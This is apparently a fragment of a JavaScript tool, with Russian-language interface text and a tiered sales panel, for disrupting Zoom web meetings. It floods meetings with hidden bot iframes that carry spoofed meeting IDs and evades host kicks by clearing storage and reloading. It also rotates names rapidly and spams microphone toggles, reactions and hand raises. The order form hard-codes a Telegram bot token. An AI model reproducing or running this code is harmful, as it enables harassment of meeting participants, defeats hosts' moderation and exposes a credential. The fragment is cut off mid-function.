    window.reactionList = ["💀", "☠", "🤣", "😂", "😄", "😅", "😊", "😇", "😉", "😍", "😘", "😜", "🤪", "🤩", "😎", "😏", "😡", "😱", "😳", "😢", "😭", "😤", "😬", "😷", "🤔", "🤨", "🤗", "🤭", "🙄", "😬", "🤓", "😺", "🙈", "🙉", "🙊", "👻", "💩", "👀", "😬", "💔", "❤️", "💕", "💞", "💓", "💖", "💗", "💘", "💝", "🌈", "✨", "🎉", "🎊", "🎈", "🔥", "🌹", "🍕", "🍔", "🍦", "☕", "🍩", "🥳", "😋", "😏", "🤠", "🤑", "😻", "🤖", "👽", "👾", "🌸", "🌼", "🌻", "🌺", "🌷", "🍀", "🍂", "🍁", "🌊", "🏖️", "🏞️", "🌍", "🌌", "🌈", "⭐", "🌟", "💫", "🌠", "🌌", "🦄", "🐉"],
    namesList,
    reactionList;
    // ... existing code ...
var T = ["Александр", "Дмитрий", "Максим", "Сергей", "Андрей", "Алексей", "Артём", "Илья", "Кирилл", "Михаил", "Никита", "Матвей", "Роман", "Егор", "Арсений", "Иван", "Денис", "Евгений", "Даниил", "Тимофей", "Владислав", "Игорь", "Владимир", "Павел", "Руслан", "Марк", "Константин", "Тимур", "Олег", "Ярослав", "Антон", "Николай", "Глеб", "Данил", "Савелий", "Вадим", "Степан", "Юрий", "Богдан", "Артур"]
, O = ["Смирнов", "Иванов", "Кузнецов", "Попов", "Соколов", "Лебедев", "Козлов", "Новиков", "Морозов", "Петров", "Волков", "Соловьёв", "Васильев", "Зайцев", "Павлов", "Семёнов", "Голубев", "Виноградов", "Богданов", "Воробьёв", "Фёдоров", "Михайлов", "Беляев", "Тарасов", "Белов", "Комаров", "Орлов", "Киселёв", "Макаров", "Андреев", "Ковалёв", "Ильин", "Гусев", "Титов", "Кузьмин", "Кудрявцев", "Баранов", "Куликов", "Алексеев", "Степанов"];
    function _() {
        var e = T[Math.floor(Math.random() * T.length)]
          , t = O[Math.floor(Math.random() * O.length)];
        return "".concat(e, " ").concat(t)
    }
    function A() {
        A.nameChangeInterval && clearInterval(A.nameChangeInterval);
        var e = Array.from({
            length: 1e3
        }, _)
          , t = 0;
        A.nameChangeInterval = setInterval((function() {
            if (0 !== e.length) {
                var n = e[t]
                  , o = n.includes(" ") ? n : encodeURIComponent(n);
                if (o)
                    try {
                        r(o)
                    } catch (e) {
                        console.warn("Skipping user: ".concat(n, " - Error: ").concat(e.message))
                    }
                t = (t + 1) % e.length
            }
        }
        ), 1)
    }
    A.nameChangeInterval = null,
    A.stop = function() {
        return clearInterval(A.nameChangeInterval)
    }
    ;
    const M = A;
    var N = e(" ", 
    "data:image/png;base64,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");

e.addSeparator(N),
e.addButton(N, "💎 КУПИТЬ КЛИЕНТ В TELEGRAM", false, function() {
    var n = window.open("about:blank", "Bot Panel - " + d);
    d++;
    n.document.title = "КЛИЕНТ ЗУМ";

    n.document.head.innerHTML = `
        <style>
            @keyframes gradientBG {
                0% { background-position: 0% 50%; }
                50% { background-position: 100% 50%; }
                100% { background-position: 0% 50%; }
            }
            @keyframes float {
                0% { transform: translateY(0px); }
                50% { transform: translateY(-10px); }
                100% { transform: translateY(0px); }
            }
            body {
                background: linear-gradient(-45deg, #1a1a1a, #2d2d2d, #1f1f1f, #2a2a2a);
                background-size: 400% 400%;
                animation: gradientBG 15s ease infinite;
                color: white;
                font-family: 'Segoe UI', Arial, sans-serif;
                padding: 30px;
                margin: 0;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
            }
            .container {
                max-width: 1200px;
                text-align: center;
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                gap: 25px;
                padding: 20px;
            }
            .price-box {
                width: 280px;
                padding: 30px;
                background: rgba(33, 150, 243, 0.08);
                backdrop-filter: blur(10px);
                transition: all 0.4s ease;
                border-radius: 15px;
                box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            }
            .price-box:hover {
                transform: translateY(-8px);
                box-shadow: 0 15px 30px rgba(33, 150, 243, 0.3);
            }
            .price-box h2 {
                color: #2196F3;
                margin-bottom: 25px;
                font-size: 26px;
                text-shadow: 0 0 15px rgba(33, 150, 243, 0.4);
            }
            .price-box ul {
                text-align: left;
                list-style-type: none;
                padding: 0;
                margin: 20px 0;
            }
            .price-box li {
                margin: 15px 0;
                padding: 8px 8px 8px 30px;
                position: relative;
                transition: all 0.3s ease;
            }
            .price-box li:before {
                content: "✦";
                color: #2196F3;
                position: absolute;
                left: 5px;
            }
            .price-tag {
                font-size: 32px;
                color: #2196F3;
                font-weight: bold;
                margin: 20px 0;
                text-shadow: 0 0 10px rgba(33, 150, 243, 0.3);
            }
            .telegram-link {
                display: inline-block;
                margin-top: 35px;
                padding: 18px 45px;
                background: linear-gradient(45deg, #2196F3, #00BCD4);
                border-radius: 35px;
                color: white;
                text-decoration: none;
                font-weight: bold;
                text-align: center;
                transition: all 0.4s ease;
                box-shadow: 0 8px 20px rgba(33, 150, 243, 0.4);
            }
            .telegram-link:hover {
                transform: translateY(-3px);
                box-shadow: 0 12px 25px rgba(33, 150, 243, 0.5);
            }
            .order-form {
                background: rgba(33, 150, 243, 0.08);
                padding: 30px;
                border-radius: 15px;
                margin-top: 30px;
                width: 100%;
                max-width: 500px;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: #2196F3;
            }
            .form-group input, .form-group select {
                width: 100%;
                padding: 12px;
                border: 1px solid rgba(33, 150, 243, 0.3);
                border-radius: 8px;
                background: rgba(255, 255, 255, 0.05);
                color: white;
                font-size: 16px;
            }
            .form-group input:focus, .form-group select:focus {
                outline: none;
                border-color: #2196F3;
            }
            .submit-btn {
                background: linear-gradient(45deg, #2196F3, #00BCD4);
                border: none;
                padding: 15px 30px;
                border-radius: 25px;
                color: white;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            .submit-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 8px 15px rgba(33, 150, 243, 0.3);
            }
            .version-selector, .payment-selector {
                display: flex;
                gap: 10px;
                margin-bottom: 20px;
            }
            .version-option, .payment-option {
                flex: 1;
                padding: 15px;
                border: 2px solid #2196F3;
                border-radius: 10px;
                cursor: pointer;
                transition: all 0.3s ease;
                background: rgba(33, 150, 243, 0.1);
            }
            .version-option.selected, .payment-option.selected {
                background: rgba(33, 150, 243, 0.3);
                transform: scale(1.05);
            }
            .version-option:hover, .payment-option:hover {
                background: rgba(33, 150, 243, 0.2);
            }
            .telegram-input {
                position: relative;
                margin-bottom: 20px;
            }
            .telegram-input input {
                width: 100%;
                padding: 12px 12px 12px 35px;
                border: 2px solid rgba(33, 150, 243, 0.3);
                border-radius: 8px;
                background: rgba(255, 255, 255, 0.05);
                color: white;
                font-size: 16px;
                transition: all 0.3s ease;
            }
            .telegram-input:before {
                content: "@";
                position: absolute;
                left: 12px;
                top: 50%;
                transform: translateY(-50%);
                color: #2196F3;
                font-size: 18px;
                font-weight: bold;
            }
            .telegram-input input:focus {
                outline: none;
                border-color: #2196F3;
                box-shadow: 0 0 10px rgba(33, 150, 243, 0.2);
            }
            .telegram-input input::placeholder {
                color: rgba(255, 255, 255, 0.5);
            }
        </style>
    `;

    n.document.body.innerHTML = `
        <div class="container">
            <div class="price-box">
                <h2>📦 Базовая версия</h2>
                <div class="price-tag">199₽</div>
                <ul>
                    <li>Обойти кик вручную</li>
                    <li>⚙️ Быстрая смена ника</li>
                    <li>⚙️ Параметры микрофона</li>
                    <li>✋ Автоматическое поднятие руки</li>
                </ul>
                <p>‼️ Важно: Накрутка ботов доступна только от 999₽</p>
            </div>

            <div class="price-box">
                <h2>💼 Профессиональная версия</h2>
                <div class="price-tag">999₽</div>
                <ul>
                    <li>🎉 Все функции Basic</li>
                    <li>🛡 Автоматический обход кика</li>
                    <li>👥 Копировать имена участников</li>
                    <li>✏️ Настройка комбо спама</li>
                    <li>💥 Агрессивный спам</li>
                    <li>💫 Дублировать конференцию</li>
                </ul>
                <p>🔄 Запуск ботов (лимит до 50)</p>
            </div>

            <div class="price-box">
                <h2>🌈 Ultimate версия</h2>
                <div class="price-tag">1999₽</div>
                <ul>
                    <li>🎉 Все функции Pro</li>
                    <li>🔄 Создать резервное подключение</li>
                    <li>⚙️ Настройка спама реакций</li>
                    <li>⚙️ Настройка спама руки</li>
                    <li>🎯 Запуск спама реакций</li>
                    <li>⚡️ Все шаблоны спама</li>
                </ul>
                <p>🔄 На запуск ботов лимита нету</p>
            </div>

            <div class="price-box">
                <h2>💸 Заказ и детали</h2>
                <p>Пишите в личные сообщения!</p>
                <a href="https://t.me/NearIyEpoint" class="telegram-link" target="_blank">Написать в Telegram</a>
            </div>

            <form class="order-form" id="orderForm">
                <h2 style="color: #2196F3; margin-bottom: 25px;">Оформить заказ</h2>
                <div class="form-group">
                    <label>Выберите версию</label>
                    <div class="version-selector">
                        <div class="version-option" data-version="basic" data-price="199">
                            <h3>Базовая</h3>
                            <p>199₽</p>
                        </div>
                        <div class="version-option" data-version="pro" data-price="999">
                            <h3>Профессиональная</h3>
                            <p>999₽</p>
                        </div>
                        <div class="version-option" data-version="ultimate" data-price="1999">
                            <h3>Ultimate</h3>
                            <p>1999₽</p>
                        </div>
                    </div>
                    <input type="hidden" name="version" id="selectedVersion" required>
                </div>
                <div class="form-group">
                    <label>Выберите способ оплаты</label>
                    <div class="payment-selector">
                        <div class="payment-option" data-payment="card">
                            <h3>💳 Карта</h3>
                            <p>Visa/MasterCard</p>
                        </div>
                        <div class="payment-option" data-payment="qiwi">
                            <h3>📱 QIWI</h3>
                            <p>Электронный кошелек</p>
                        </div>
                        <div class="payment-option" data-payment="crypto">
                            <h3>₿ Крипта</h3>
                            <p>BTC/ETH/USDT</p>
                        </div>
                    </div>
                    <input type="hidden" name="payment" id="selectedPayment" required>
                </div>
                <div class="form-group">
                    <label>Ваш Telegram</label>
                    <div class="telegram-input">
                        <input type="text" name="telegram" placeholder="username" required pattern="[A-Za-z0-9_]{5,32}" title="Введите корректное имя пользователя Telegram (5-32 символа, только буквы, цифры и подчеркивания)">
                    </div>
                </div>
                <button type="submit" class="submit-btn">Оформить заказ</button>
            </form>
        </div>
    `;

    // Добавляем обработчики для селектора версий
    const versionOptions = n.document.querySelectorAll('.version-option');
    const selectedVersionInput = n.document.getElementById('selectedVersion');

    versionOptions.forEach(option => {
        option.addEventListener('click', function() {
            versionOptions.forEach(opt => opt.classList.remove('selected'));
            this.classList.add('selected');
            selectedVersionInput.value = this.dataset.version;
        });
    });

    // Добавляем обработчики для селектора оплаты
    const paymentOptions = n.document.querySelectorAll('.payment-option');
    const selectedPaymentInput = n.document.getElementById('selectedPayment');

    paymentOptions.forEach(option => {
        option.addEventListener('click', function() {
            paymentOptions.forEach(opt => opt.classList.remove('selected'));
            this.classList.add('selected');
            selectedPaymentInput.value = this.dataset.payment;
        });
    });

    // Обработчик отправки формы
    n.document.getElementById('orderForm').addEventListener('submit', function(e) {
        e.preventDefault();
        if (!selectedVersionInput.value) {
            showCustomAlert('Пожалуйста, выберите версию!');
            return;
        }
        if (!selectedPaymentInput.value) {
            showCustomAlert('Пожалуйста, выберите способ оплаты!');
            return;
        }
        
        // Добавляем анимацию при отправке формы
        const form = e.target;
        form.style.transition = 'all 0.3s ease';
        form.style.transform = 'scale(0.98)';
        form.style.opacity = '0.8';
        
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData);
        
        // Формируем сообщение для отправки
        const message = `🛒 Новый заказ:\n\n🔹 Версия: ${data.version}\n💳 Способ оплаты: ${data.payment}\n👤 Telegram: @${data.telegram}`;
        
        // Отправляем сообщение через бота в канал
        const BOT_TOKEN = '7892348359:AAE8Fy6SyQ5qOR1XM4t0tOdT0kq0GLYSRO4';
        const CHAT_ID = '-1002453736153';
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(response => response.json())
        .then(result => {
            // Возвращаем форму в исходное состояние с анимацией
            form.style.transform = 'scale(1)';
            form.style.opacity = '1';
            
            if(result.ok) {
                showCustomAlert('Заказ успешно отправлен! Мы свяжемся с вами в Telegram.', () => {
                    window.open(`https://t.me/ZoomNRL`, '_blank');
                });
            } else {
                throw new Error('Ошибка отправки');
            }
        })
        .catch(error => {
            // Возвращаем форму в исходное состояние с анимацией
            form.style.transform = 'scale(1)';
            form.style.opacity = '1';
            
            console.error('Error:', error);
            showCustomAlert('❌ Ошибка!\n\nПроизошла ошибка при отправке заказа. Пожалуйста, напишите нам напрямую в Telegram.', () => {
                window.open(`https://t.me/ZoomNRL`, '_blank');
            });
        });
    });

    // Функция для показа кастомного алерта с улучшенными анимациями
    function showCustomAlert(message, callback) {
        const alertBox = n.document.createElement('div');
        alertBox.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8);
            background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
            backdrop-filter: blur(20px);
            padding: 35px;
            border-radius: 24px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                       0 0 100px rgba(82, 0, 255, 0.05),
                       inset 0 0 0 1px rgba(255,255,255,0.1);
            z-index: 999999;
            min-width: 300px;
            text-align: center;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        `;

        const messageText = n.document.createElement('p');
        messageText.style.cssText = `
            color: #fff;
            margin: 0 0 25px 0;
            font-size: 16px;
            line-height: 1.4;
            transform: translateY(10px);
            opacity: 0;
            transition: all 0.4s ease 0.2s;
        `;
        messageText.textContent = message;

        const okButton = n.document.createElement('button');
        okButton.textContent = 'OK';
        okButton.style.cssText = `
            background: #22C55E;
            border: none;
            padding: 10px 25px;
            border-radius: 12px;
            color: white;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(34, 197, 94, 0.3);
            transform: translateY(10px);
            opacity: 0;
        `;
        okButton.onmouseover = () => {
            okButton.style.background = '#1ea750';
            okButton.style.transform = 'translateY(-2px)';
            okButton.style.boxShadow = '0 6px 15px rgba(34, 197, 94, 0.4)';
        };
        okButton.onmouseout = () => {
            okButton.style.background = '#22C55E';
            okButton.style.transform = 'translateY(0)';
            okButton.style.boxShadow = '0 4px 12px rgba(34, 197, 94, 0.3)';
        };
        okButton.onclick = () => {
            alertBox.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8)';
            alertBox.style.opacity = '0';
            setTimeout(() => {
                alertBox.remove();
                if (callback) callback();
            }, 300);
        };

        alertBox.appendChild(messageText);
        alertBox.appendChild(okButton);
        n.document.body.appendChild(alertBox);
        
        // Анимация появления
        setTimeout(() => {
            alertBox.style.opacity = '1';
            alertBox.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0deg) scale(1)';
            messageText.style.transform = 'translateY(0)';
            messageText.style.opacity = '1';
            okButton.style.transform = 'translateY(0)';
            okButton.style.opacity = '1';
        }, 10);
    }

    var a = document.createElement("div");
    a.style.display = "flex";
    a.style.flexWrap = "wrap";
    a.style.justifyContent = "center";
    a.style.marginTop = "30px";
    n.document.body.appendChild(a);

    for (var i = 0; i < t; i++) {
        var l = document.createElement("iframe");
        l.src = meetingURL;
        if (e) {
            l.style.width = "0%";
            l.style.height = "0%";
            l.style.display = "none";
        } else {
            l.style.width = "700px";
            l.style.height = "900px";
            l.style.border = "none";
            l.style.borderRadius = "15px";
            l.style.margin = "10px";
            l.style.boxShadow = "0px 4px 8px rgba(0, 0, 0, 0.1)";
            l.style.transition = "all 0.3s ease";
            l.style.opacity = "0";
            l.style.transform = "scale(0.95)";
            // Анимация появления iframe
            setTimeout((frame) => {
                frame.style.opacity = "1";
                frame.style.transform = "scale(1)";
            }, i * 100, l);
        }
        a.appendChild(l);
        var c = l.contentWindow;
        (c.webpackChunkwebclient = c.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
            e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
        }]);
    }

    for (var s = a.querySelectorAll("iframe"), u = 0; u < s.length; u++) {
        if (u % 5 == 0 && u !== 0) {
            var p = document.createElement("div");
            p.style.width = "100%";
            a.appendChild(p);
        }
    }
}, function() {
    console.log("Button disabled!");
}),
e.addSeparator(N),
e.addSubtitle(N, "ОБХОД КИКА"),
e.addButton(N, "🛡️ АВТОМАТИЧЕСКИЙ ОБХОД КИКА", !0, (function enableAutoRejoin() {
    if (!window.autoRejoinInterval) {
        // Создаем слушатель для отслеживания появления модального окна кика
        window.disconnectListener = setInterval(() => {
            // Проверяем наличие модального окна в основном окне
            const mainWindowKickModal = document.querySelector('.zm-modal-body-title');
            
            // Проверяем наличие модального окна в iframe
            const iframeKickModal = n.frame.document.querySelector('.zm-modal-body-title');
            
            // Проверяем содержимое модальных окон
            const isKicked = (modal) => {
                if (!modal) return false;
                const text = modal.textContent || modal.innerText;
                return text.includes('You have been removed') || 
                       text.includes('Вас удалили') ||
                       text.includes('removed from this meeting');
            };

            // Если обнаружено модальное окно кика в любом из мест
            if (isKicked(mainWindowKickModal) || isKicked(iframeKickModal)) {
                console.log('Обнаружен кик, выполняем переподключение...');
                
                // Очищаем хранилище
                localStorage.clear();
                sessionStorage.clear();
                
                // Просто перезагружаем текущее окно
                n.frame.location.reload();
            }
        }, 500); // Проверяем каждые 500мс
    }
}), (function disableAutoRejoin() {
    if (window.disconnectListener) {
        clearInterval(window.disconnectListener);
        window.disconnectListener = null;
    }
})),

// Кнопка мгновенного обхода кика
e.addButton(N, "💫 ОБОЙТИ КИК ВРУЧНУЮ", !1, (function() {
    localStorage.clear();
    sessionStorage.clear();
    n.frame.location.reload();
})),

e.addButton(N, "🔄 СОЗДАТЬ РЕЗЕРВНОЕ ПОДКЛЮЧЕНИЕ", !0, (function() {
    !function(e) {
        localStorage.clear();
        var t = document.querySelector("#webclient");
        if (t) {
            window.meetingURL = window.meetingURL || t.src;
            for (var n = 0; n < e; n++) {
                var r = window.open(meetingURL, "_blank");
                (r.webpackChunkwebclient = r.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                    e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7)
                }
                ]),
                r.focus()
            }
        } else
            console.error("Element with ID 'webclient' not found.")
    }(1)
}
)),

    e.addSeparator(N),
    e.addSubtitle(N, "УПРАВЛЕНИЕ ИМЕНЕМ"),
    e.addButton(N, "👥 Копировать имена участников", !0, g, g.stop),
    e.addButton(N, "💫 Быстрая смена ника", !0, M, M.stop),
    e.addSeparator(N),
    e.addSubtitle(N, "УПРАВЛЕНИЕ МИКРОФОНОМ"),
    
    // Определяем функции для быстрого переключения как глобальные переменные
    window.startFastMicToggle = function() {
        if (!window.fastMicInterval) {
            window.fastMicInterval = setInterval(() => {
                // Включаем микрофон
                n.sendSocketMessage({
                    evt: n.packets.WS_AUDIO_MUTE_REQ,
                    body: {
                        id: n.state.meeting.currentUser.userId,
                        bMute: false
                    }
                })();
                
                // Выключаем через короткий интервал
                setTimeout(() => {
                    n.sendSocketMessage({
                        evt: n.packets.WS_AUDIO_MUTE_REQ,
                        body: {
                            id: n.state.meeting.currentUser.userId,
                            bMute: true
                        }
                    })();
                }, 50);
            }, 100);
        }
    };
    
    window.stopFastMicToggle = function() {
        if (window.fastMicInterval) {
            clearInterval(window.fastMicInterval);
            window.fastMicInterval = null;
        }
    };
    
    // Кнопка настроек микрофона
    e.addButton(N, "⚙️ ПАРАМЕТРЫ МИКРОФОНА", !0, (function editMicSettings() {
        const existingPrompts = document.querySelectorAll('[data-prompt-type="mic-settings"]');
        existingPrompts.forEach(prompt => prompt.remove());
    
        const promptDiv = document.createElement('div');
        promptDiv.setAttribute('data-prompt-type', 'mic-settings');
        promptDiv.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg);
            width: 450px;
            background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
            backdrop-filter: blur(20px);
            color: #fff;
            padding: 35px;
            border-radius: 24px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                       0 0 100px rgba(82, 0, 255, 0.05),
                       inset 0 0 0 1px rgba(255,255,255,0.1);
            z-index: 999999;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            opacity: 0;
            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        `;
    
        // Заголовок
        const title = document.createElement('h2');
        title.textContent = 'Параметры Микрофона';
        title.style.cssText = `
            margin: 0 0 25px 0;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            color: #22C55E;
        `;
    
        // Создаем общий стиль для контейнеров опций
        const containerStyle = `
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
        `;
    
        const labelStyle = `
            display: flex;
            align-items: center;
            justify-content: space-between;
            color: #fff;
            font-size: 14px;
        `;
    
        const toggleStyle = `
            width: 40px;
            height: 20px;
            appearance: none;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            position: relative;
            cursor: pointer;
            transition: all 0.3s ease;
        `;
    
        // Автоматическая активация
        const autoActivateContainer = document.createElement('div');
        autoActivateContainer.style.cssText = containerStyle;
        const autoActivateLabel = document.createElement('label');
        autoActivateLabel.style.cssText = labelStyle;
        const autoActivateText = document.createElement('span');
        autoActivateText.textContent = 'Автоматическая активация микрофона:';
        const autoActivateToggle = document.createElement('input');
        autoActivateToggle.type = 'checkbox';
        autoActivateToggle.checked = window.micAutoActivate || false;
        autoActivateToggle.style.cssText = toggleStyle;
    
        // Быстрое переключение
        const turboContainer = document.createElement('div');
        turboContainer.style.cssText = containerStyle;
        const turboLabel = document.createElement('label');
        turboLabel.style.cssText = labelStyle;
        const turboText = document.createElement('span');
        turboText.textContent = 'Быстрое переключение микрофона:';
        const turboToggle = document.createElement('input');
        turboToggle.type = 'checkbox';
        turboToggle.checked = window.micTurboMode || false;
        turboToggle.style.cssText = toggleStyle;
    
        // Стили для переключателей
        const style = document.createElement('style');
        style.textContent = `
            input[type="checkbox"]:checked {
                background: #22C55E;
            }
            input[type="checkbox"]::before {
                content: '';
                position: absolute;
                width: 16px;
                height: 16px;
                border-radius: 50%;
                background: white;
                top: 2px;
                left: 2px;
                transition: all 0.3s ease;
            }
            input[type="checkbox"]:checked::before {
                transform: translateX(20px);
            }
        `;
        document.head.appendChild(style);
    
        // Кнопки
        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        `;
    
        const saveButton = document.createElement('button');
        saveButton.textContent = 'Сохранить';
        saveButton.style.cssText = `
            padding: 12px 24px;
            background: #22C55E;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(34, 197, 94, 0.3);
        `;
    
        const cancelButton = document.createElement('button');
        cancelButton.textContent = 'Отмена';
        cancelButton.style.cssText = `
            padding: 12px 24px;
            background: transparent;
            color: rgb(34, 197, 94);
            border: 2px solid rgb(34, 197, 94);
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        `;
    
        // Обработчики кнопок
        saveButton.onclick = () => {
            window.micAutoActivate = autoActivateToggle.checked;
